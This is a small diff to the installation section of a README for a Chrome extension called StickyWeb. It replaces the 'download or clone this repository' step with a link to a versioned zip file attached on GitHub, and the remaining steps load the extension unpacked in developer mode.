@@ -33,7 +33,8 @@ The extension is built with Manifest V3 and vanilla JavaScript, HTML, and CSS. I
 
 StickyWeb is currently distributed as an unpacked Chrome extension.
 
-1. Download or clone this repository.
+1. Download : [StickyWeb v1.2.0.zip](https://github.com/user-attachments/files/31191293/StickyWeb.v1.2.0.zip)
+
 2. Open `chrome://extensions` in Google Chrome.
 3. Enable **Developer mode** in the upper-right corner.
 4. Select **Load unpacked**.
